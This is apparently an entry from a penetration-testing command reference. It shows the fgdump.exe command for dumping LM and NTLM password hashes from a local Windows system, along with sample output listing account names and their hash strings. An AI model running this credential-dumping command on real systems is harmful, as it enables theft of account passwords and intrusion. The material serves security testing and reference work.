---
id: 718639f6-356e-432f-8148-bba721101747
name: fgdump Dump NTLM and LM hashes from a Local Windows System
type: command
executor: bash
data: fgdump.exe
output: ':\Documents and Settings\BOB\Desktop>fgdump.exe

  fgDump 2.1.0 - fizzgig and the mighty group at foofus.net

  Written to make j0m0kun''s life just a bit easier

  Copyright(C) 2008 fizzgig and foofus.net

  fgdump comes with ABSOLUTELY NO WARRANTY!

  This is free software, and you are welcome to redistribute it

  under certain conditions; see the COPYING and README files for

  more information.


  No parameters specified, doing a local dump. Specify -? if you are looking for h

  elp.

  --- Session ID: 2019-09-26-21-04-58 ---

  Starting dump on 127.0.0.1


  ** Beginning local dump **

  OS (127.0.0.1): Microsoft Windows XP Professional Service Pack 3 (Build 2600)

  Passwords dumped successfully

  Cache dumped successfully


  -----Summary-----


  Failed servers:

  NONE


  Successful servers:

  127.0.0.1


  Total failed: 0

  Total successful: 1



  C:\Documents and Settings\BOB\Desktop>type 127.0.0.1.pwdump

  Administrator:500:B34CE522C3E4C8774A3B108F3FA6CB6D:A87F3A337D73085C45F9416BE5787

  D86:::

  Guest:501:NO PASSWORD*********************:NO PASSWORD*********************:::

  HelpAssistant:1000:F8F4AD8FB00DAB65424BDA2C69864F16:C1301105BFB89C5C1FE22B33466F

  0B9B:::

  SUPPORT_388945a0:1002:NO PASSWORD*********************:C5EC9DF061B166B6FBD0A5033

  7E6D4F1:::

  BOB:1003:NO PASSWORD*********************:81ABA903C80B8F4DAAD5225F7D996FBC:::

  '
created_at: '2019-09-26T22:51:06.755677+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# fgdump Dump NTLM and LM hashes from a Local Windows System

```bash
fgdump.exe
```

## Expected Output

```
:\Documents and Settings\BOB\Desktop>fgdump.exe
fgDump 2.1.0 - fizzgig and the mighty group at foofus.net
Written to make j0m0kun's life just a bit easier
Copyright(C) 2008 fizzgig and foofus.net
fgdump comes with ABSOLUTELY NO WARRANTY!
This is free software, and you are welcome to redistribute it
under certain conditions; see the COPYING and README files for
more information.

No parameters specified, doing a local dump. Specify -? if you are looking for h
elp.
--- Session ID: 2019-09-26-21-04-58 ---
Starting dump on 127.0.0.1

** Beginning local dump **
OS (127.0.0.1): Microsoft Windows XP Professional Service Pack 3 (Build 2600)
Passwords dumped successfully
Cache dumped successfully

-----Summary-----

Failed servers:
NONE

Successful servers:
127.0.0.1

Total failed: 0
Total successful: 1


C:\Documents and Settings\BOB\Desktop>type 127.0.0.1.pwdump
Administrator:500:B34CE522C3E4C8774A3B108F3FA6CB6D:A87F3A337D73085C45F9416BE5787
D86:::
Guest:501:NO PASSWORD*********************:NO PASSWORD*********************:::
HelpAssistant:1000:F8F4AD8FB00DAB65424BDA2C69864F16:C1301105BFB89C5C1FE22B33466F
0B9B:::
SUPPORT_388945a0:1002:NO PASSWORD*********************:C5EC9DF061B166B6FBD0A5033
7E6D4F1:::
BOB:1003:NO PASSWORD*********************:81ABA903C80B8F4DAAD5225F7D996FBC:::

```


